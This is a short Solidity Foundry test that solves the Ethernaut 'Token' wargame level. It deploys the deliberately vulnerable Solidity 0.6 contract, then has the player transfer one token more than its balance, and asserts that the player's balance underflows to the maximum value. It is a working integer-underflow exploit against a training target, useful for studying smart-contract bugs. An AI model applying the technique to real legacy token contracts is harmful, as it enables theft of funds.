// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";

/// @notice Minimal ABI used by the modern test harness to interact with the Solidity 0.6 target.
interface IToken {
    /// @notice Transfers tokens from the caller to another address.
    function transfer(address to, uint256 value) external returns (bool);

    /// @notice Returns the token balance assigned to an address.
    function balanceOf(address account) external view returns (uint256);
}

/// @title Ethernaut 05 - Token Solution Test
/// @notice Verifies that an insufficient-balance transfer wraps the sender's balance in Solidity 0.6.
contract TokenTest is Test {
    /// @notice Interface for the deployed Solidity 0.6 target.
    IToken target;

    /// @notice Account used to solve the level.
    address player = makeAddr("player");

    /// @notice Separate recipient required to reduce the player's balance.
    address receiver = makeAddr("receiver");

    /// @notice Deploys the legacy artifact and gives the player the level's initial 20 tokens.
    /// @dev deployCode keeps the vulnerable source on Solidity 0.6 while this test uses modern forge-std.
    function setUp() public {
        target = IToken(deployCode("05_Token.sol:Token", abi.encode(uint256(100))));

        bool transferred = target.transfer(player, 20);

        assertTrue(transferred);
        assertEq(target.balanceOf(player), 20);
    }

    /// @notice Transfers one token beyond the player's balance and confirms the resulting underflow.
    function testSolve() public {
        vm.prank(player);
        bool transferred = target.transfer(receiver, 21);

        assertTrue(transferred);
        assertEq(target.balanceOf(receiver), 21);
        assertEq(target.balanceOf(player), type(uint256).max);
    }
}
